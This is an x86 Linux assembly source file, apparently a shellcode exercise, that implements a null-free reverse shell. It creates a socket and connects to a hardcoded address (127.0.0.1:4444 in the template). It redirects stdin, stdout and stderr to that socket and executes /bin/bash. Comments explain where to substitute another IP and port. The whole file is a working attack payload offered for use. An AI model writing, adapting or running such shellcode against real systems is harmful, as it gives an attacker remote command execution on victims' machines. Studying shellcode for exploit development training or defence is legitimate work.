; reverse.nasm
; Author: Bo Pearce

global _start

section .text
_start: 

	;General reverse/client setup
	;s = socket(AF_INET, SOCK_STREAM, 0);

	;addr.sin_family = AF_INET;
	;addr.sin_port = htons(port);
	;addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	;connect(s, (struct sockaddr *)&addr, sizeof(addr));

	;dup2(s, 0);
	;dup2(s, 1);
	;dup2(s, 2);

	;execve("/bin/bash", NULL, NULL);

	;zero registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	;call socket
	push 0x6 ;TCP
	push 0x1 ;SOCK_STREAM
	push 0x2 ;AF_INET
	mov ecx, esp ;POINTER AT ECX TO DATA
	mov bl, 0x1 ;socket
	mov al, 0x66 ;socketcall
	int 0x80
	mov esi, eax ;save fd

	;call connect
	;build sockaddr_in struct

	;example of pushing 0x100007f and using no nulls:
	;mov ah, 0x1
	;mov al, dl
	;push ax
	;mov ah, dl
	;mov al, 0x7f
	;push ax

	push DWORD 0x100007f ;PLACE IP IN REVERSE BYTE ORDER HERE
	push WORD 0x5c11 ;PLACE PORT IN REVERSE BYTE ORDER HERE
	mov bl, 0x2 
	push bx ;AF_INET
	mov ecx, esp
	push 0x10
	push ecx
	push esi
	mov ecx, esp
	mov bl, 0x3
	mov al, 0x66
	int 0x80

	;dup2
	mov ebx, esi ;file descriptor
	mov ecx, edx	
	mov al, 0x3f
	int 0x80

	mov cl, 0x1
	mov al, 0x3f
	int 0x80

	mov cl, 0x2
	mov al, 0x3f
	int 0x80

	;int execve(const char *filename, char *const argv[], char *const envp[]);
	push edx ;NULL
        push 0x68736162 ;/bin/bash pushed in reverse on stack
        push 0x2f6e6962
        push 0x2f2f2f2f
	mov ebx, esp ;pointer to filename
	push edx ;NULL
	push ebx 
	mov ecx, esp
	mov al, 0xb
	int 0x80

